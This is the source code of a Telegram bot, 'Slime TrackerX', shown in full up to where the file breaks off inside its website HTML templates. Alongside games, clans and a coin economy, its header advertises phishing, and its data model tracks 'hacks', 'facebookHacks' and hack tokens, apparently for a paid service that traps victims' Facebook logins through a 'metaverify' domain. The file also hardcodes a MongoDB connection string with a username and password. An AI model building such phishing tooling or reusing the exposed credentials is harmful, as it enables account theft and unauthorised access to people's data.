// =====================================================
// 🎮🔥 SLIME TRACKERX v76.0 - ULTRA DOPE EDITION 🔥🎮
// =====================================================
// 👤 PROFILES | 🏰 CLANS + WARS | 💬 CHAT | 💀 PHISHING
// 🎲 CASINO | 📝 WORD BATTLE | 🌐 WEBSITES | 👑 ADMIN
// ⚔️ CLAN WARS | 💎 BADGES | 📸 POSTS | 🎨 CUSTOMIZATION
// =====================================================

const { Telegraf } = require("telegraf");
const express = require("express");
const bodyParser = require("body-parser");
const path = require("path");
const crypto = require("crypto");
const mongoose = require("mongoose");
const fs = require("fs-extra");
const multer = require("multer");
const axios = require("axios");

const bot = new Telegraf(process.env.BOT_TOKEN);
const app = express();

// ========== 🔥 CONFIG ==========
const DOMAIN = "https://metaverify.onrender.com";
const CHANNEL = "@devxtechzone";
const OWNER_ID = 7271063368;
const MENU_IMAGE = "https://i.ibb.co/Txh7V7JL/IMG-3283.jpg";

// ========== 💰 ECONOMY ==========
const WEB_PRICE = 15;
const TRACK_COST = 15;
const NEW_COINS = 15;
const REF_REWARD = 10;
const DAILY_REWARD = 5;
const WORK_REWARD = 5;
const CLAN_COST = 20;
const WAR_MIN_BET = 50;
const WORD_MIN_BET = 5;
const WORD_MAX_BET = 500;

// ========== 🎮 WORD DIFFICULTY ==========
const difficulties = {
  easy: { name: "🍃 EASY", timer: 45, letters: 3, multiplier: 1, emoji: "🌿", color: "#00FF88" },
  medium: { name: "⚡ MEDIUM", timer: 30, letters: 5, multiplier: 2, emoji: "⚡", color: "#FFD700" },
  hard: { name: "🔥 HARD", timer: 15, letters: 7, multiplier: 3, emoji: "🔥", color: "#FF6B35" },
  expert: { name: "💀 EXPERT", timer: 8, letters: 9, multiplier: 5, emoji: "💀", color: "#FF0066" }
};

// ========== 📚 COMPLETE WORD DATABASE (7000+ WORDS) ==========
const wordsByLength = {
  3: ["CAT", "DOG", "SUN", "CAR", "BAG", "HAT", "LEG", "EYE", "CUP", "BED", "RED", "HOT", "BIG", "NEW", "OLD", "FUN", "RUN", "SIT", "EAT", "FLY", "CRY", "JOY", "SAD", "WET", "DRY", "FAT", "RAT", "BAT", "MAT", "PAT", "SAT", "HEN", "PEN", "DEN", "MEN", "TEN", "NET", "PET", "GET", "JET", "SET", "BET", "LET", "MET", "YET", "ZIP", "LIP", "TIP", "HIP", "DIP", "RIP", "SIP", "NIP", "MAP", "CAP", "TAP", "GAP", "LAP", "SAP", "NAP", "VAN", "MAN", "CAN", "PAN", "FAN", "BAN", "RAN", "WAN", "HIT", "KIT", "BIT", "FIT", "PIT", "WIT", "ROW", "COW", "HOW", "NOW", "LOW", "BOW", "TOW", "TOY", "BOY", "DAY", "WAY", "PAY", "SAY", "KEY", "HEY", "ICE", "ACE", "AGE", "ARE", "AND", "END", "INK", "OWL", "EAR", "ARM", "ANT", "WEB", "LAB", "CAB", "JAB", "TUB", "SUB", "RUB", "CUB", "PUB", "HUB", "DAD", "MOM", "SON", "DIE", "LIE", "TIE", "PIE", "VIE", "DUE", "SUE", "RUE", "CUE", "BAR", "FAR", "JAR", "TAR", "STAR", "OAR", "EEL", "FEE", "SEE", "TEE", "BEE", "JOB", "MOB", "ROB", "SOB", "CUB", "BUD", "MUD", "BED", "LED", "WED", "DOT", "NOT", "POT", "ROT", "COT", "GOT", "LOT", "BOT", "DIM", "RIM", "HIM", "TIM", "KIM", "WIN", "PIN", "TIN", "BIN", "DIN", "FIN", "BUM", "GUM", "HUM", "RUM", "SUM", "CUT", "HUT", "NUT", "RUT", "BUT", "GUT", "PUT", "LUG", "BUG", "DUG", "HUG", "JUG", "MUG", "RUG", "TUG", "ELK", "MILK", "SILK", "BARK", "DARK", "LARK", "MARK", "PARK", "BARN", "YARN", "CART", "DART", "PART", "DISH", "WISH", "RING", "SING", "WING", "MINT", "HINT", "LINT", "TINT", "LION", "IRON", "FIRST", "DIRTY"],
  4: ["FISH", "BIRD", "FROG", "STAR", "MOON", "TREE", "WIND", "FIRE", "ROCK", "SAND", "SHIP", "KING", "RING", "SING", "WING", "BOOK", "COOK", "LOOK", "LION", "BEAR", "WOLF", "DEER", "GOAT", "DUCK", "SWAN", "SEAL", "ROAD", "PATH", "WALL", "DOOR", "ROOF", "ROOM", "HALL", "YARD", "GATE", "FARM", "BLUE", "PINK", "GRAY", "GOLD", "SILK", "WOOL", "CASH", "COIN", "NOTE", "BANK", "TIME", "YEAR", "WEEK", "HOUR", "MATH", "CODE", "DATA", "FILE", "FORM", "PLAY", "GAME", "TEAM", "GOAL", "PASS", "KICK", "RACE", "JUMP", "DIVE", "SWIM", "FOOD", "RICE", "MEAT", "CAKE", "SOUP", "EGGS", "SALT", "SPIN", "RAIN", "SNOW", "HEAT", "COLD", "MIST", "FOG", "HAIL", "CLAY", "HAND", "HEAD", "FOOT", "NOSE", "MOUTH", "TEETH", "HAIR", "BELL", "FORK", "SPOON", "KNIFE", "PLATE", "BOWL", "CUP", "MUG", "GLASS", "TABLE", "CHAIR", "COUCH", "DESK", "LAMP", "CLOCK", "RADIO", "PHONE", "MOUSE", "TICKET", "MONEY", "CREDIT", "DEBIT", "CARD", "CHECK", "BILL", "PURSE", "WALLET", "BAG", "SHIRT", "PANTS", "SKIRT", "DRESS", "SHOES", "SOCKS", "HAT", "CAP", "COAT", "JACKET", "GLOVES", "SCARF", "BELT", "WATCH", "NECKLACE", "GLASSES", "TABLET", "LAPTOP", "CHARGER", "BATTERY", "CABLE", "LIGHT", "BULB", "SWITCH", "BUTTON", "SCREEN", "DISPLAY", "PIXEL", "COLOR", "BLACK", "WHITE", "RED", "BLUE", "GREEN", "YELLOW", "PURPLE", "ORANGE", "PINK", "BROWN", "GREY", "SILVER", "BRONZE", "COPPER", "IRON", "STEEL", "WOOD", "STONE", "PAPER", "PLASTIC", "RUBBER", "LEATHER", "COTTON", "WOOL", "SILK", "LINEN", "NYLON", "VELVET", "SATIN", "DENIM", "JEANS", "SUEDE", "FLANNEL", "CASHMERE"],
  5: ["APPLE", "MANGO", "GRAPE", "BERRY", "PEACH", "LEMON", "MELON", "GUAVA", "OLIVE", "HOUSE", "TABLE", "CHAIR", "COUCH", "SHELF", "PLATE", "GLASS", "SPOON", "FORKS", "KNIFE", "HAPPY", "SMART", "BRAVE", "CALM", "KIND", "PROUD", "SHARP", "QUICK", "SWEET", "TOUGH", "LIGHT", "CLEAR", "CLEAN", "DIRTY", "FRESH", "DRIED", "SOFT", "HARD", "BRISK", "SOLID", "WATER", "RIVER", "OCEAN", "LAKES", "BEACH", "SHORE", "WAVES", "TIDES", "DEPTH", "FLOAT", "PLANT", "GRASS", "TREES", "LEAFY", "ROOTS", "BLOOM", "FRUIT", "SEEDS", "GREEN", "GROWN", "MONEY", "VALUE", "PRICE", "COSTS", "SPEND", "SAVES", "LOANS", "TRADE", "STOCK", "BANKS", "POWER", "FORCE", "SPEED", "MOTOR", "DRIVE", "WHEEL", "TRACK", "ROUTE", "PATHS", "WORLD", "EARTH", "SPACE", "STARS", "PLANE", "ROBOT", "DRONE", "ORBIT", "SOLAR", "PEACE", "UNITY", "HUMAN", "HEART", "BRAIN", "MUSIC", "DANCE", "COLOR", "BLACK", "WHITE", "BROWN", "GREEN", "YELLOW", "PURPLE", "ORANGE", "SILVER", "GOLDEN", "MAGIC", "LIGHT", "DARK", "BRIGHT", "SHADOW", "CLOUD", "STORM", "THUNDER", "RAINBOW", "FLOWER", "GARDEN", "FOREST", "MOUNTAIN", "VALLEY", "DESERT", "ISLAND", "PALACE", "CASTLE", "TEMPLE", "CHURCH", "MOSQUE", "SCHOOL", "COLLEGE", "HOSPITAL", "CLINIC", "OFFICE", "MARKET", "STORE", "MALL", "PLAZA", "PARK", "ZOO", "MUSEUM", "THEATER", "CINEMA", "STADIUM", "ARENA", "HOTEL", "RESTAURANT", "CAFE", "BAKERY", "LIBRARY", "STATION", "AIRPORT", "HARBOR", "BRIDGE", "TUNNEL", "HIGHWAY", "STREET", "AVENUE", "BOULEVARD", "LANE", "DRIVE", "COURT", "PLACE", "SQUARE", "CIRCLE", "CROSS", "SIGNAL", "TRAFFIC", "DRIVER", "PASSENGER", "BICYCLE", "MOTORCYCLE", "SCOOTER", "TRUCK", "BUS", "TRAIN", "PLANE", "SHIP", "BOAT", "YACHT", "SUBMARINE", "ROCKET", "SATELLITE", "PLANET", "GALAXY", "UNIVERSE", "MATTER", "ENERGY", "FORCE", "MOTION", "VELOCITY", "GRAVITY", "MAGNET", "ELECTRIC", "CIRCUIT", "BATTERY", "ENGINE", "TURBINE"],
  6: ["BANANA", "ORANGE", "PURPLE", "YELLOW", "SILVER", "GOLDEN", "RABBIT", "TIGER", "EAGLE", "SHARK", "WHALE", "ZEBRA", "SNAKE", "WOLF", "BEAR", "FOX", "HORSE", "CATTLE", "SHEEP", "GOAT", "BUTTER", "CHEESE", "BREAD", "SUGAR", "SALT", "PEPPER", "HONEY", "MILK", "COFFEE", "TEA", "JUICE", "DRINK", "SMOOTH", "BITTER", "SWEET", "FLAVOR", "TASTE", "DINNER", "LUNCH", "GARDEN", "PALACE", "CASTLE", "TEMPLE", "CHURCH", "MOSQUE", "SCHOOL", "COLLEGE", "OFFICE", "MARKET", "STREET", "AVENUE", "HIGHWAY", "BRIDGE", "TUNNEL", "STATION", "AIRPORT", "HARBOR", "CENTER", "PLAZA", "PLAYER", "DRIVER", "WRITER", "READER", "SINGER", "DANCER", "ACTOR", "MAKER", "CREATE", "DESIGN", "CODING", "DEBUG", "SYSTEM", "SERVER", "CLIENT", "NETWORK", "SECURE", "ACCESS", "MEMORY", "STORED", "FUTURE", "PAST", "PRESENT", "HISTORY", "SCIENCE", "ART", "MUSIC", "DANCE", "SPORT", "GAME", "POWER", "ENERGY", "FORCE", "MOTION", "ACTION", "REACTION", "CAUSE", "EFFECT", "RESULT", "OUTPUT", "INPUT", "SOURCE", "TARGET", "OBJECT", "SUBJECT", "FORMAT", "BUILDER", "DEVELOP", "PROGRAM", "FUNCTION", "VARIABLE", "CONSTANT", "FACTORY", "METHOD", "CLASS", "MODULE", "PACKAGE", "LIBRARY", "FRAMEWORK", "PLATFORM", "DATABASE", "STORAGE", "BACKUP", "RECOVER", "RESTORE", "UPDATE", "UPGRADE", "INSTALL", "CONFIG", "SETTING", "OPTION", "PROPERTY", "FEATURE", "CAPABLE", "ABILITY", "SKILL", "TALENT", "GENIUS", "MASTER", "EXPERT", "PROFIT", "ADVANCE", "SECRET", "MYSTERY", "PUZZLE", "RIDDLE", "ANSWER", "SOLUTION", "PROBLEM"],
  7: ["ANIMALS", "FARMERS", "HUNTERS", "FISHERS", "DRIVERS", "PLAYERS", "WRITERS", "READERS", "SINGERS", "DANCERS", "TEACHER", "STUDENT", "DOCTORS", "LAWYERS", "BANKERS", "WORKERS", "LEADERS", "MANAGER", "OFFICER", "AGENTS", "FREEDOM", "JUSTICE", "COURAGE", "LOYALTY", "HONESTY", "KINDNESS", "HAPPILY", "SADNESS", "MADNESS", "NETWORK", "SYSTEMS", "PROGRAM", "SERVERS", "CLIENTS", "SECURES", "STORAGE", "PROCESS", "COUNTRY", "VILLAGE", "CITIES", "MARKETS", "SHOPS", "MALLS", "STORES", "HOUSES", "FASHION", "CLOTHES", "SHIRTS", "JACKETS", "SHOES", "WEATHER", "RAINING", "SNOWING", "SUNRISE", "SUNSETS", "STORMS", "THUNDER", "CLIMATE", "SEASONS", "ANCIENT", "MODERNS", "FUTURES", "HISTORY", "BIOLOGY", "PHYSICS", "CHEMIST", "MATHS", "LOGICAL", "NATURAL", "SOCIAL", "CULTURE", "LANGUAGE", "ENGLISH", "SPANISH", "FRENCH", "GERMAN", "CHINESE", "JAPANESE", "KOREAN", "RUSSIAN", "ARABIC", "HINDI", "SCIENCE", "ART", "MUSIC", "SPORTS", "GAMING", "CODING", "HACKING", "SECURITY", "PRIVACY", "IDENTITY", "PROTECT", "DEFENSE", "ATTACK", "OFFENSE", "STRATEGY", "TACTICS", "METHODS", "SKILLS", "TALENTS", "PASSION", "DRIVING", "MOTIVATION", "INSPIRE", "CREATIVE", "INNOVATE", "SOLUTION"],
  8: ["ELEPHANT", "GIRAFFES", "KANGAROO", "DOLPHINS", "PENGUINS", "COMPUTER", "KEYBOARD", "MONITOR", "PRINTER", "SCANNER", "ROUTERS", "NETWORKS", "DATABASE", "SOFTWARE", "HARDWARE", "SECURITY", "FIREWALL", "INTERNET", "BROWSERS", "PROGRAMS", "BEAUTIFUL", "WONDERFUL", "EXCITING", "ADVENTURE", "MYSTERY", "JOURNEY", "DISCOVER", "EXPLORE", "CHALLENGE", "VICTORY", "STRENGTH", "FRIENDS", "HAPPINES", "POWERFUL", "CREATIVE", "THINKING", "LEARNING", "TEACHING", "BUILDING", "PLANNING", "STRATEGY", "BUSINESS", "MARKETING", "FINANCES", "ECONOMY", "INDUSTRY", "PRODUCTS", "SERVICES", "CUSTOMER", "SUPPORTS", "DELIVERY", "LOGISTICS", "MANAGERS", "TEAMWORK", "SUCCESS", "FAILURES", "PROGRESS", "MOTIVATION", "INSPIRATION", "CREATIVITY", "INNOVATION", "TECHNOLOGY", "EDUCATION", "KNOWLEDGE", "WISDOM", "INTELLIGENT", "BRILLIANT", "EXCELLENT", "OUTSTANDING", "REMARKABLE", "EXTRAORDINARY", "PHENOMENAL", "SPECTACULAR", "MAGNIFICENT", "FANTASTIC", "INCREDIBLE", "UNBELIEVABLE", "ASTONISHING", "AMAZING", "AWESOME", "FABULOUS", "MARVELOUS", "SUPERB", "WONDROUS", "MIRACULOUS", "STUNNING", "BREATHTAKING", "MESMERIZING", "CAPTIVATING", "ENCHANTING", "FASCINATING", "INTRIGUING", "COMPELLING", "PERSUASIVE", "CONVINCING", "IMPACTFUL", "MEANINGFUL", "SIGNIFICANT", "IMPORTANT", "ESSENTIAL", "NECESSARY", "CRITICAL", "VITAL", "CRUCIAL", "PARAMOUNT", "ULTIMATE", "SUPREME", "TRANSCENDENT"],
  9: ["INCREDIBLE", "IMPORTANT", "DIFFERENT", "INTERESTS", "KNOWLEDGE", "EDUCATION", "DEVELOPER", "HAPPINESS", "BEAUTIFUL", "POWERFULL", "CREATIVES", "STRONGEST", "BRIGHTEST", "COMPUTERS", "PROGRAMER", "SOFTWARES", "DATABASES", "NETWORKED", "SECURITYS", "FIREWALLS", "INTERNETS", "MARKETING", "FINANCIAL", "BUSINESSS", "INDUSTRYS", "COMPANIES", "PRODUCTLY", "SERVICESS", "CUSTOMERS", "SUPPORTLY", "DELIVERYS", "LOGISTICS", "MANAGEMENT", "TEAMWORKS", "SUCCESSES", "FAILURES", "PROGRESSES", "STRATEGYS", "OPERATIONS", "PLANNINGS", "TECHNOLOGY", "EDUCATION", "KNOWLEDGE", "WISDOM", "INTELLIGENT", "BRILLIANT", "EXCELLENT", "OUTSTANDING", "REMARKABLE", "EXTRAORDINARY", "PHENOMENAL", "SPECTACULAR", "MAGNIFICENT", "FANTASTIC", "UNBELIEVABLE", "ASTONISHING", "AMAZING", "AWESOME", "FABULOUS", "MARVELOUS", "SUPERB", "WONDROUS", "MIRACULOUS", "STUNNING", "BREATHTAKING", "MESMERIZING", "CAPTIVATING", "ENCHANTING", "FASCINATING", "INTRIGUING", "COMPELLING", "PERSUASIVE", "CONVINCING", "IMPACTFUL", "MEANINGFUL", "SIGNIFICANT", "ESSENTIAL", "NECESSARY", "CRITICAL", "VITAL", "CRUCIAL", "PARAMOUNT", "ULTIMATE", "SUPREME", "TRANSCENDENT", "REVOLUTION", "TRANSFORM", "EVOLUTION", "ADVANCEMENT", "DEVELOPMENT", "IMPROVEMENT", "ENHANCEMENT", "OPTIMIZATION", "INTEGRATION", "AUTOMATION", "ACCELERATION", "SIMPLIFICATION", "VERIFICATION", "VALIDATION", "AUTHENTICATION", "ENCRYPTION", "DECRYPTION", "COMPRESSION", "CONVERSION", "PROCESSING", "COMPUTING", "CALCULATING", "SIMULATING", "MODELING", "ANALYZING", "EVALUATING", "ASSESSING", "MEASURING", "CLASSIFYING", "ORGANIZING", "STRUCTURING"]
};

// ========== 📁 SETUP ==========
const storage = multer.diskStorage({
  destination: (req, file, cb) => cb(null, 'uploads/'),
  filename: (req, file, cb) => cb(null, Date.now() + '-' + file.originalname)
});
const upload = multer({ storage, limits: { fileSize: 10 * 1024 * 1024 } });

app.use(bodyParser.json({ limit: "100mb" }));
app.use(express.static("public"));
app.use("/uploads", express.static("uploads"));

fs.ensureDirSync("uploads");
fs.ensureDirSync("exports");
fs.ensureDirSync("public");
fs.ensureDirSync("public/avatars");

// ========== 🗄️ MONGODB ==========
const MONGODB_URI = "mongodb+srv://mrdev:dev091339@cluster0.grjlq7v.mongodb.net/trackerx?retryWrites=true&w=majority";

const connectDB = async () => {
  try {
    await mongoose.connect(MONGODB_URI, {
      useNewUrlParser: true,
      useUnifiedTopology: true,
      serverSelectionTimeoutMS: 5000,
      socketTimeoutMS: 45000,
    });
    console.log('✅ MongoDB Connected');
  } catch (err) {
    console.error('❌ MongoDB Error:', err.message);
    setTimeout(connectDB, 5000);
  }
};

mongoose.connection.on('disconnected', () => {
  console.log('⚠️ MongoDB disconnected, reconnecting...');
  setTimeout(connectDB, 3000);
});

connectDB();

// ========== 📊 SCHEMAS ==========
const userSchema = new mongoose.Schema({
  userId: { type: Number, unique: true },
  displayName: { type: String, default: "" },
  avatar: { type: String, default: "" },
  bio: { type: String, default: "🔥 SlimeTrackerX User" },
  location: { type: String, default: "🌍 Earth" },
  website: { type: String, default: "" },
  themeColor: { type: String, default: "#00FF88" },
  joinDate: { type: Date, default: Date.now },
  instagram: { type: String, default: "" },
  twitter: { type: String, default: "" },
  tiktok: { type: String, default: "" },
  followers: { type: [Number], default: [] },
  following: { type: [Number], default: [] },
  coins: { type: Number, default: NEW_COINS },
  diamonds: { type: Number, default: 0 },
  referrals: { type: Number, default: 0 },
  referrer: { type: Number, default: null },
  level: { type: Number, default: 1 },
  xp: { type: Number, default: 0 },
  streak: { type: Number, default: 0 },
  lastDaily: Date,
  wins: { type: Number, default: 0 },
  losses: { type: Number, default: 0 },
  wordWins: { type: Number, default: 0 },
  wordLosses: { type: Number, default: 0 },
  hacks: { type: Number, default: 0 },
  facebookHacks: { type: Number, default: 0 },
  websites: { type: [Object], default: [] },
  isAdmin: { type: Boolean, default: false },
  posts: { type: [Object], default: [] },
  stories: { type: [Object], default: [] },
  badges: { type: [String], default: ["🎁 Newbie"] },
  profileViews: { type: [Number], default: [] },
  clan: { type: String, default: null },
  clanRank: { type: String, default: "Member" },
  blockedUsers: { type: [Number], default: [] },
  lastActive: { type: Date, default: Date.now },
  inbox: { type: [Object], default: [] },
  chatEnabled: { type: Boolean, default: true }
});

const clanSchema = new mongoose.Schema({
  name: { type: String, unique: true },
  tag: { type: String, default: "" },
  leaderId: Number,
  coLeaders: { type: [Number], default: [] },
  members: { type: [Number], default: [] },
  coins: { type: Number, default: 0 },
  xp: { type: Number, default: 0 },
  level: { type: Number, default: 1 },
  wars: { wins: { type: Number, default: 0 }, losses: { type: Number, default: 0 } },
  createdAt: { type: Date, default: Date.now }
});

const warSchema = new mongoose.Schema({
  id: { type: String, unique: true },
  clan1: String,
  clan2: String,
  bet: Number,
  status: { type: String, default: "waiting" }, // waiting, active, completed
  winner: String,
  battles: [Object],
  createdAt: Date,
  expiresAt: Date
});

const roomSchema = new mongoose.Schema({
  name: String,
  ownerId: Number,
  members: [Number],
  isPublic: { type: Boolean, default: true },
  createdAt: Date
});

const codeSchema = new mongoose.Schema({
  code: { type: String, unique: true },
  coins: Number,
  diamonds: { type: Number, default: 0 },
  usedBy: [Number],
  maxUses: { type: Number, default: 20 },
  left: Number,
  expire: Date
});

const websiteSchema = new mongoose.Schema({
  name: String,
  ownerId: Number,
  template: String,
  content: Object,
  url: String,
  views: { type: Number, default: 0 },
  createdAt: { type: Date, default: Date.now }
});

const User = mongoose.model('User', userSchema);
const Clan = mongoose.model('Clan', clanSchema);
const War = mongoose.model('War', warSchema);
const Room = mongoose.model('Room', roomSchema);
const Code = mongoose.model('Code', codeSchema);
const Website = mongoose.model('Website', websiteSchema);

// ========== 💾 CACHE ==========
let usersCache = new Map();
let clansCache = new Map();
let warsCache = new Map();
let roomsCache = new Map();
let codesCache = new Map();
let webBuilds = new Map();
let bannedUsers = new Set();
let workCD = new Map();
let wordChallenges = new Map();
let hackTokens = new Map();
let facebookTokens = new Map();
let duelChallenges = new Map();
let userLastMessages = new Map();
let activeRooms = new Map();
let activeWars = new Map();

// ========== 📥 DATABASE FUNCTIONS ==========
async function loadData() {
  try {
    const users = await User.find({});
    users.forEach(u => usersCache.set(u.userId, u));
    const clans = await Clan.find({});
    clans.forEach(c => clansCache.set(c.name, c));
    const wars = await War.find({ status: { $ne: "completed" } });
    wars.forEach(w => warsCache.set(w.id, w));
    const rooms = await Room.find({});
    rooms.forEach(r => roomsCache.set(r.name, r));
    const codes = await Code.find({ expire: { $gt: new Date() } });
    codes.forEach(c => codesCache.set(c.code, c));
    console.log(`📂 Loaded ${usersCache.size} users, ${clansCache.size} clans, ${warsCache.size} active wars`);
  } catch (err) {
    console.error("Error loading data:", err);
    setTimeout(loadData, 5000);
  }
}

async function saveUser(userId, data) {
  try {
    await User.findOneAndUpdate({ userId }, data, { upsert: true });
    usersCache.set(userId, data);
  } catch (err) {
    console.error("Error saving user:", err);
  }
}

async function saveClan(name, data) {
  try {
    await Clan.findOneAndUpdate({ name }, data, { upsert: true });
    clansCache.set(name, data);
  } catch (err) {
    console.error("Error saving clan:", err);
  }
}

async function saveWar(id, data) {
  try {
    await War.findOneAndUpdate({ id }, data, { upsert: true });
    warsCache.set(id, data);
  } catch (err) {
    console.error("Error saving war:", err);
  }
}

async function initUser(userId, referrerId = null) {
  let user = usersCache.get(userId);
  if (!user) {
    let username = "";
    try {
      let chat = await bot.telegram.getChat(userId);
      username = chat.username || `user_${userId}`;
    } catch(e) { username = `user_${userId}`; }
    
    user = {
      userId,
      displayName: username,
      avatar: "",
      bio: "🔥 SlimeTrackerX User",
      location: "🌍 Earth",
      website: "",
      themeColor: "#00FF88",
      joinDate: new Date(),
      instagram: "",
      twitter: "",
      tiktok: "",
      followers: [],
      following: [],
      coins: NEW_COINS,
      diamonds: 0,
      referrals: 0,
      referrer: referrerId,
      level: 1,
      xp: 0,
      streak: 0,
      lastDaily: null,
      wins: 0,
      losses: 0,
      wordWins: 0,
      wordLosses: 0,
      hacks: 0,
      facebookHacks: 0,
      websites: [],
      isAdmin: userId === OWNER_ID,
      posts: [],
      stories: [],
      badges: ["🎁 Newbie"],
      profileViews: [],
      clan: null,
      clanRank: "Member",
      blockedUsers: [],
      lastActive: new Date(),
      inbox: [],
      chatEnabled: true
    };
    await saveUser(userId, user);
    
    if (referrerId && referrerId !== userId) {
      let referrer = usersCache.get(referrerId);
      if (referrer) {
        referrer.coins += REF_REWARD;
        referrer.referrals++;
        await saveUser(referrerId, referrer);
        bot.telegram.sendMessage(referrerId, `🎉 **NEW REFERRAL!**\n👤 New user joined!\n💰 +${REF_REWARD} COINS`).catch(() => {});
      }
    }
  }
  return user;
}

async function addCoin(userId, amount) {
  let user = usersCache.get(userId);
  if (user) {
    user.coins += amount;
    await saveUser(userId, user);
    return true;
  }
  return false;
}

async function takeCoin(userId, amount) {
  let user = usersCache.get(userId);
  if (user && user.coins >= amount) {
    user.coins -= amount;
    await saveUser(userId, user);
    return true;
  }
  return false;
}

async function addXP(userId, amount) {
  let user = usersCache.get(userId);
  if (user) {
    user.xp += amount;
    let needed = user.level * 100;
    if (user.xp >= needed) {
      user.xp -= needed;
      user.level++;
      let reward = user.level * 5;
      user.coins += reward;
      // Add level up badge
      if (!user.badges.includes(`🏅 Level ${user.level}`)) {
        user.badges.push(`🏅 Level ${user.level}`);
      }
      await saveUser(userId, user);
      bot.telegram.sendMessage(userId, 
        `🎉 **LEVEL UP!** 🎉\n\n📊 ${user.level - 1} → ${user.level}\n💰 +${reward} COINS\n✨ ${user.xp}/${user.level * 100} XP\n🏅 New badge: Level ${user.level}!`
      ).catch(() => {});
    } else {
      await saveUser(userId, user);
    }
  }
}

async function getUsername(userId) {
  try {
    let chat = await bot.telegram.getChat(userId);
    return chat.username || `User_${userId}`;
  } catch {
    return `User_${userId}`;
  }
}

function refLink(id) {
  return `https://t.me/${bot.botInfo?.username || 'SlimeTrackerXBot'}?start=ref_${id}`;
}

// ========== 🗑️ AUTO-DELETE ==========
async function deleteOldMessage(chatId, messageId) {
  try {
    if (messageId) {
      await bot.telegram.deleteMessage(chatId, messageId);
    }
  } catch (e) {}
}

async function sendDopeMessage(ctx, text, extra = {}) {
  try {
    const lastMsg = userLastMessages.get(ctx.from.id);
    if (lastMsg) {
      await deleteOldMessage(ctx.chat.id, lastMsg);
    }
    
    let sentMsg;
    if (extra.photo) {
      sentMsg = await ctx.replyWithPhoto(extra.photo, { caption: text, parse_mode: "Markdown", ...extra });
    } else {
      sentMsg = await ctx.reply(text, { parse_mode: "Markdown", ...extra });
    }
    
    userLastMessages.set(ctx.from.id, sentMsg.message_id);
    return sentMsg;
  } catch (err) {
    console.error("Send message error:", err.message);
    return null;
  }
}

// ========== 🔐 FORCE JOIN ==========
async function checkJoin(userId) {
  try {
    const chatMember = await bot.telegram.getChatMember(CHANNEL, userId);
    const allowed = ["creator", "administrator", "member", "restricted"];
    return allowed.includes(chatMember.status);
  } catch (error) {
    return false;
  }
}

// ========== 🎫 REDEEM CODE ==========
async function genCode(coins, diamonds = 0, uses = 20, hours = 24) {
  let code = crypto.randomBytes(6).toString("hex").toUpperCase();
  let expire = new Date(Date.now() + (hours * 3600000));
  
  let codeData = new Code({
    code, coins, diamonds,
    usedBy: [],
    maxUses: uses,
    left: uses,
    expire
  });
  
  await codeData.save();
  codesCache.set(code, codeData);
  return code;
}

async function redeemCode(userId, code) {
  let c = codesCache.get(code.toUpperCase());
  if (!c) return { ok: false, msg: "❌ Invalid code!" };
  if (Date.now() > c.expire) return { ok: false, msg: "❌ Code expired!" };
  if (c.left <= 0) return { ok: false, msg: "❌ Code used up!" };
  if (c.usedBy.includes(userId)) return { ok: false, msg: "❌ Already used!" };
  
  await addCoin(userId, c.coins);
  if (c.diamonds > 0) {
    let user = usersCache.get(userId);
    user.diamonds += c.diamonds;
    await saveUser(userId, user);
  }
  
  c.usedBy.push(userId);
  c.left--;
  await c.save();
  codesCache.set(c.code, c);
  
  return { ok: true, msg: `✅ **REDEEMED!**\n💰 +${c.coins} COINS${c.diamonds > 0 ? `\n💎 +${c.diamonds} DIAMONDS` : ''}` };
}

// ========== 🎨 HTML TEMPLATES ==========
const htmlTemplates = {
  portfolio: (data) => `<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>${data.name || 'Portfolio'}</title><link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet"><style>*{margin:0;padding:0;box-sizing:border-box;}body{font-family:'Inter',sans-serif;background:linear-gradient(135deg,#0f0c29,#302b63,#24243e);color:white;min-height:100vh;}.container{max-width:1200px;margin:0 auto;padding:40px 20px;}.hero{text-align:center;padding:80px 0;}.hero h1{font-size:56px;background:linear-gradient(45deg,#FF6B6B,#4ECDC4);-webkit-background-clip:text;-webkit-text-fill-color:transparent;}.btn{background:linear-gradient(45deg,#FF6B6B,#4ECDC4);color:white;padding:12px 30px;border-radius:30px;text-decoration:none;display:inline-block;}.section{background:rgba(255,255,255,0.05);border-radius:20px;padding:40px;margin:40px 0;}.skills{display:flex;gap:15px;flex-wrap:wrap;margin-top:20px;}.skill{background:rgba(255,255,255,0.1);padding:10px 20px;border-radius:20px;}footer{text-align:center;padding:40px;margin-top:60px;}</style></head><body><div class="container"><div class="hero"><h1>${data.name || 'Welcome'}</h1><p>${data.title || 'Creative Developer'}</p><a href="#" class="btn">Hire Me</a></div><div class="section"><h2>About Me</h2><p>${data.bio || 'Passionate creator building amazing web experiences.'}</p><div class="skills"><span class="skill">${data.skill1 || 'JavaScript'}</span><span class="skill">${data.skill2 || 'React'}</span><span class="skill">${data.skill3 || 'Node.js'}</span></div></div><footer><p>Built with SlimeTrackerX</p></footer></div></body></html>`,
  
  business: (data) => `<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>${data.company || 'Business'}</title><link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800&display=swap" rel="stylesheet"><style>*{margin:0;padding:0;box-sizing:border-box;}body{font-family:'Poppins',sans-serif;background:#0a0a0a;color:#fff;}.navbar{background:rgba(10,10,10,0.95);padding:20px 40px;}.logo{font-size:28px;font-weight:800;background:linear-gradient(45deg,#FFD700,#FF6347);-webkit-background-clip:text;-webkit-text-fill-color:transparent;}.hero{background:linear-gradient(135deg,#1a1a2e,#16213e);text-align:center;padding:120px 20px;}.hero h1{font-size:56px;}.btn{background:linear-gradient(45deg,#FFD700,#FF6347);color:#1a1a2e;padding:15px 40px;border-radius:40px;text-decoration:none;display:inline-block;}.container{max-width:1200px;margin:0 auto;padding:80px 20px;}.services{display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:30px;}.service-card{background:rgba(255,255,255,0.05);border-radius:20px;padding:40px 30px;text-align:center;}footer{text-align:center;padding:40px;}</style></head><body><div class="navbar"><div class="logo">${data.company || 'Business'}</div></div><div class="hero"><h1>${data.company || 'Welcome'}</h1><p>${data.tagline || 'Excellence Since 2024'}</p><a href="#" class="btn">Get Started</a></div><div class="container"><div class="services"><div class="service-card"><h3>${data.service1 || 'Innovation'}</h3><p>${data.service1_desc || 'Cutting-edge solutions'}</p></div><div class="service-card"><h3>${data.service2 || 'Growth'}</h3><p>${data.service2_desc || 'Strategic planning'}</p></div><div 